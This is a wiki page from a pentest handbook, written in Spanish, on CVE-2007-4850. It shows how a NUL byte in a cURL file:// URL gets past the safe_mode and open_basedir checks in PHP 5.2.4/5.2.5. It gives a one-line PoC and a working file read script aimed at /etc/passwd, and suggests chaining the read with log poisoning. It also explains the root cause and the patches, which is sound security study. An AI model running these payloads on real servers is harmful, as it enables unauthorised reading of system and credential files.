# PHP 5.2.4 y 5.2.5 PHP cURL

{{#include ../../../../banners/hacktricks-training.md}}

Esta página documenta un truco legacy pero aún útil en CTFs/instalaciones-legacy-locales para bypass de las comprobaciones safe_mode/open_basedir de PHP usando la extensión cURL en builds específicos de PHP 5.2.x.

- Affected: PHP 5.2.4 and 5.2.5 with ext/curl enabled.
- Impact: Leer archivos locales arbitrarios a pesar de las restricciones de safe_mode u open_basedir (sin ejecución directa de código).
- ID: CVE-2007-4850.

From http://blog.safebuff.com/2016/05/06/disable-functions-bypass/

## PoC de una línea

Si safe_mode u open_basedir están activos y cURL está habilitado, lo siguiente devolverá el contenido del script actual:
```php
var_dump(curl_exec(curl_init("file://safe_mode_bypass\x00".__FILE__)));
```
## Más explícito PoC (arbitrary file read)
```php
<?php
// Preconditions (legacy): PHP 5.2.4/5.2.5, safe_mode or open_basedir enabled, ext/curl loaded
$target = '/etc/passwd'; // change to the file you want to read
$ch = curl_init();
// The trick is the NUL byte (\x00). Prefix can be any string; checks are confused and the file after the NUL is read.
curl_setopt($ch, CURLOPT_URL, 'file://prefix'.chr(0).$target);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$resp = curl_exec($ch);
$err  = curl_error($ch);
curl_close($ch);
if ($resp !== false) {
echo $resp; // should contain the target file
} else {
echo "cURL error: $err\n";
}
?>
```
Notas:
- Usa comillas dobles o chr(0) para inyectar un byte NUL real. El percent-encoding (%00) no funcionará de forma fiable.
- Esta es una primitiva de lectura de archivos. Combínala con otras primitivas (log poisoning, session file inclusion, etc.) para escalada adicional cuando sea posible.

## Por qué funciona (resumen)

La vulnerabilidad radica en cómo PHP 5.2.4/5.2.5 realizaba las comprobaciones de safe_mode/open_basedir para URLs file:// en ext/curl. La comprobación analizaba la URL y validaba un componente de ruta, pero debido al manejo del byte NUL validaba una cadena distinta de la que realmente usaba libcurl. En la práctica, el validador podía aprobar la ruta después del NUL mientras que libcurl usaba la parte antes del NUL como contenedor de la URL, permitiendo un bypass que resultaba en la lectura del archivo colocado después del byte NUL. Véase el análisis original y la macro afectada en curl/interface.c para más detalles. [CVE-2007-4850].

## Restricciones y correcciones

- Corregido en versiones posteriores 5.2.x (por ejemplo, paquetes de distro parcheados a 5.2.6) mediante la corrección del análisis/validación en ext/curl.
- Solo afecta a despliegues de PHP muy antiguos; safe_mode fue eliminado en PHP 5.4 y las builds modernas no exhiben este comportamiento.

## Véase también

Otros bypasses de disable_functions/open_basedir y técnicas modernas están recopiladas aquí:

{{#ref}}
README.md
{{#endref}}



## Referencias

- Entrada de Ubuntu del CVE con indicaciones de parche y versiones afectadas: https://ubuntu.com/security/CVE-2007-4850
- Análisis técnico con contexto de código (cxsecurity): http://cxsecurity.com/issue/WLB-2008010060
{{#include ../../../../banners/hacktricks-training.md}}
